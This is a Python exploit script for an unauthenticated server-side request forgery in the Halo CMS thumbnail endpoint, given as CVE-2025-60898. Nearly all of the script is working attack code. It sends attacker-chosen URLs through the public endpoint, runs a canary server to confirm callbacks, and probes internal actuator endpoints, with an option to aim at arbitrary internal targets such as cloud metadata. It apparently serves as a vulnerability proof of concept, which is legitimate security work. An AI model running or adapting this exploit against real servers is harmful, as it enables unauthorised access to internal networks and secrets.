#!/usr/bin/env python3
"""
CWE-918 (SSRF): Unauthenticated SSRF in Halo CMS Thumbnail Service
Exploit for CVE-2025-60898 / CVSS 9.1 Critical

Usage:
    python3 CVE-2025-60898.py http://target-halo:8090
    python3 CVE-2025-60898.py http://target-halo:8090 --target http://127.0.0.1:8080/admin  
    python3 CVE-2025-60898.py http://target-halo:8090 --canary-port 9999
"""

import requests
import sys
import argparse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import time

class SSRFCanary(BaseHTTPRequestHandler):
    hits = []
    
    def do_GET(self):
        self.hits.append({'path': self.path, 'ip': self.client_address[0], 'time': time.time()})
        print(f"[+] SSRF HIT: {self.client_address[0]} -> GET {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'SSRF_SUCCESS')
    
    def log_message(self, format, *args): pass

def start_canary(port):
    server = HTTPServer(('0.0.0.0', port), SSRFCanary)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def exploit_ssrf(halo_url, target_url):
    """Execute SSRF attack via thumbnail endpoint"""
    endpoint = f"{halo_url}/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri"
    
    try:
        print(f"[*] Targeting: {endpoint}")
        print(f"[*] SSRF URL: {target_url}")
        
        # No authentication needed - public endpoint!
        response = requests.get(endpoint, params={'uri': target_url, 'size': 's'}, timeout=10)
        
        print(f"[*] Status: {response.status_code}")
        
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            print(f"[+] SSRF SUCCESS: 302 redirect to {location}")
            return True
        elif response.status_code == 200:
            print(f"[+] SSRF SUCCESS: 200 response (internal service accessible)")  
            return True
        else:
            print(f"[-] Response: {response.status_code} - {response.reason}")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Halo CMS SSRF Exploit CVE-2025-60898')
    parser.add_argument('halo_url', help='Halo CMS URL (e.g., http://localhost:8090)')
    parser.add_argument('--target', help='SSRF target URL', default=None)
    parser.add_argument('--canary-port', type=int, help='Local canary server port', default=8888)
    
    args = parser.parse_args()
    
    halo_url = args.halo_url.rstrip('/')
    
    print("=" * 60)
    print("Halo CMS SSRF Exploit - CWE-918 (SSRF)")
    print("Unauthenticated Server-Side Request Forgery")
    print("=" * 60)
    
    if args.target:
        # Custom target
        print("[*] Custom SSRF target mode")
        success = exploit_ssrf(halo_url, args.target)
    else:
        # Canary server proof
        print("[*] Starting canary server for SSRF proof...")
        canary = start_canary(args.canary_port)
        print(f"[*] Canary listening on port {args.canary_port}")
        
        # Target canary via Docker networking
        canary_url = f"http://host.docker.internal:{args.canary_port}/ssrf-proof"
        
        SSRFCanary.hits = []  # Reset
        success = exploit_ssrf(halo_url, canary_url)
        
        time.sleep(2)  # Wait for canary hit
        
        if SSRFCanary.hits:
            print(f"[+] CANARY HIT CONFIRMED: {len(SSRFCanary.hits)} connections")
            success = True
        else:
            print("[-] No canary hits detected")
    
    # Quick internal recon
    print("\n[*] Testing internal services...")
    internal_targets = [
        "http://127.0.0.1:8090/actuator/health",
        "http://localhost:8090/actuator/info"
    ]
    
    for target in internal_targets:
        exploit_ssrf(halo_url, target)
    
    print("\n" + "=" * 60)
    if success:
        print("[+] SSRF VULNERABILITY CONFIRMED!")
        print("[+] Anonymous attacker can proxy requests through server")
        print("[!] Risk: Internal network access, cloud metadata exposure")
    else:
        print("[-] SSRF not confirmed")
    print("=" * 60)
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())